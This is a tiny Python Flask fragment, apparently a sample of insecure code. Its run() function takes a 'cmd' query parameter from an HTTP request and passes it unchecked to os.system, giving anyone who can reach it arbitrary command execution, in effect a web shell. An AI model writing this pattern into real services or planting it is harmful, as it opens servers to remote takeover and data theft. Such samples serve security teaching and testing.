import os
from flask import request
def run():
    cmd = request.args.get("cmd")
    os.system(cmd)
